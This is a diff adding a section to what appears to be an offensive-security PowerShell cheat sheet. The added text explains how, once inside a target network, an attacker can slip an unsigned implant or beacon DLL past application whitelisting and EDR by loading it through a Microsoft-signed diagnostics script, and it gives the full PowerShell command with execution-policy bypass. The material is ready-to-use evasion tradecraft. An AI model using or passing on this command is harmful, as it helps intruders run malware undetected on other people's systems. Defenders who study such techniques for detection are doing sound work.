@@ -34,6 +34,16 @@ foreach ($result in $results)
 
 .NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.
 
+### Blend in execution of implant or beacon into regular activity
+
+If you find yourself inside a target environment with strong application whitelisting controls, pesky EDR that blocks common LOLBins, and/or just need an option to blend in execution of your unsigned implant or beacon into regular activity, consider this: 
+Microsoft-signed utility buried in c:\windows\diagnostics\system\networking that will execute unsigned DLLs through the Microsoft utility. I’m not sure why this functionality exists for this particular utility, and I seriously doubt Microsoft will address it;
+```powershell
+powershell.exe -ep bypass -command “set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()”```
+```
+
+
+
 ### Load PowerShell script reflectively
 Proxy-aware:
 ```powershell
